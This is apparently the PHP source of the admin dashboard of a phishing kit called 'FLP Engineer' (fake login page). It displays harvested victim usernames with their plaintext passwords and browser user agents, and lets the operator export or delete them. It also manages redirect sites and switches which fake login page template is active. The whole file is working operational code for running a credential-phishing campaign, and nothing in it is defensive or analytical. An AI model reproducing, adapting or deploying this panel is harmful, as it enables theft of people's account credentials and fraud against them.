<?php
include 'common.php';

// Logs
$page = ((isset($_GET['page']) && is_numeric($_GET['page']) && $_GET['page'] > 0) ? $_GET['page'] : 1);
$logs = $logs_model->get_logs($page);
$num_logs = $logs_model->get_total_pages();

// Sites
$sites = $sites_model->get_sites();

// Flps
$flp_dir = '../flps/*{.html, .xhtml, .txt, .php, .xml}';
$flp_array = array();

foreach(glob($flp_dir, GLOB_BRACE) as $flp) {
   	$flp_array[] = basename($flp);
}

// Active FLP
$active_flps = $config_model->get_active_flp();
$row = $active_flps->fetch_assoc();

$info = pathinfo($row['config_value']);
$active_flp = basename($row['config_value'], '.'.$info['extension']);

ob_start("ob_gzhandler");
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title><?php echo $lang['FLP_ENGINEER']; ?></title>

<link rel="stylesheet" type="text/css" href="styles/default.css" media="screen, print" />
<link rel="stylesheet" type="text/css" href="styles/colorbox.css" type="text/css" media="screen, projection" />

<script type="text/javascript" src="scripts/jquery.js"></script>
<script type="text/javascript" src="scripts/jquery.colorbox-min.js"></script>
<script type="text/javascript" src="scripts/default.js"></script>
</head>
<body>
<div id="wrapper">
	<div id="header">
		<h1><?php echo $lang['FLP_ENGINEER']; ?></h1>
		
		<ul id="account">
			<li><a href="#" id="add_user_btn"><?php echo $lang['ADD_USER']; ?></a></li>
			<li><a href="login.php?action=logout"><?php echo $lang['LOGOUT']; ?></a></li>
		</ul>
	</div>
	
	<div class="module wide">
		<h2><?php echo $lang['FLP_LOGS']; ?> (<?php echo $logs->num_rows . ' ' . $lang['LOGS']; ?>)</h2>
		
		<form action="modify.php" method="post" class="manage">							
			<ol id="db">
			<?php if($logs && $logs->num_rows > 0): ?>
				<?php while($row = $logs->fetch_assoc()): ?>
					<li>
						<span class="time"><?php echo date("d M Y", $row['user_time']); ?></span>
						<div class="info">
							<strong><?php echo $row['user_name']; ?></strong> — <?php echo $row['user_password']; ?> 
							<span class="opts"><input type="checkbox" name="userid[]" value="<?php echo $row['user_id']; ?>" /></span><br />
							<span class="details"><?php echo $row['user_agent']; ?></span>
						</div>
					</li>
				<?php endwhile; ?>
			<?php else: ?>
				<li><?php echo $lang['NO_LOGINS']; ?></li>
			<?php endif; ?>
			</ol>
			
			<dl id="pagination">
				<dt><strong><?php echo $lang['PAGE']; ?></strong>: <?php echo "$page of $num_logs"; ?></dt>
				<dd><?php if($page > 1) echo '<a href="index.php?page=' . ($page - 1) . '" title="' . $lang['PREVIOUS'] . '" class="btn">' . $lang['PREVIOUS'] . '</a>'; ?></dd>
				<dd><?php if($num_logs - $page > 0) echo '<a href="index.php?page=' . ($page + 1) . '" title="' . $lang['NEXT'] . '" class="btn">' . $lang['NEXT'] . '</a>'; ?></dd>
			</dl>
			
			<div class="marks">
				<a href="#" id="mark_all_btn" class="btn" title="<?php echo $lang['MARK_ALL']; ?>"><?php echo $lang['MARK_ALL']; ?></a>
			</div>
			
			<div class="actions">
				<select name="action">
					<option value="export_logs"><?php echo $lang['EXPORT']; ?></option>
					<option value="delete_logs"><?php echo $lang['DELETE']; ?></option>
				</select>
				<label for="action"><?php echo $lang['MARKED_LOGS']; ?></label>
				<input type="hidden" name="backtrack" value="index.php" />
				<input type="submit" name="submit" value="now" />
			</div>
		</form>
	</div>
	
	<div class="module narrow">
		<form action="modify.php" method="post" class="manage">
			<ul class="side_list">
				<li><h2><?php echo $lang['FLP_REDIRECTS']; ?> (<?php echo $sites->num_rows . ' ' . $lang['REDIRECTS']; ?>)</h2></li>
				<?php if($sites && $sites->num_rows > 0):?>
					<?php while($row = $sites->fetch_assoc()):?>
						<li>
							<span class="redirect"><a href="<?php echo $row['site_redirect']; ?>"><?php echo $row['site_redirect']; ?></a></span> <?php echo ($row['site_active']) ? '(Active)' : ''; ?>
							<span class="opts"><input type="radio" name="siteid" value="<?php echo $row['site_id']; ?>" /></span>
						</li>
					<?php endwhile; ?>
				<?php else: ?>
					<li><?php echo $lang['NO_SITES']; ?></li>
				<?php endif; ?>
				
				<li><a href="#add_site_form" id="add_site_btn"><?php echo $lang['ADD_NEW_SITE']; ?></a></li>
			</ul>
			
			<div class="actions">
				<select name="action">
					<option value="activate_site"><?php echo $lang['ACTIVATE']; ?></option>
					<option value="delete_site"><?php echo $lang['DELETE']; ?></option>
				</select>
				<label for="action"><?php echo $lang['MARKED_SITES']; ?></label>
				<input type="hidden" name="backtrack" value="index.php" />
				<input type="submit" name="submit" value="now" />
			</div>
		</form>
	</div>
	
	<div class="module narrow">
		<form action="modify.php" method="post" class="manage">
			<ul class="side_list">
				<li><h2><?php echo $lang['FLP_DIRECTORY']; ?></h2></li>
				<?php foreach($flp_array as $file):?>
					<li>
						<?php 
							$info = pathinfo($file);
							$flp = basename($file, '.'.$info['extension']);
							echo $flp . (($flp === $active_flp) ? ' (Active)' : ''); 
						?>
						<span class="opts"><input type="radio" name="flp_url" value="<?php echo $file; ?>" /></span>
					</li>
				<?php endforeach;?>
			</ul>
			
			<div class="actions">
				<input type="hidden" name="action" value="activate_flp" />
				<input type="hidden" name="backtrack" value="index.php" />
				<input type="submit" name="submit" value="<?php echo $lang['SET_FLP']; ?>" />
			</div>
		</form>
	</div>
	
	<div class="clear"></div>
	
	<div id="footer">
		<?php echo $lang['COPY']; ?>
	</div>
</div>
</body>
</html>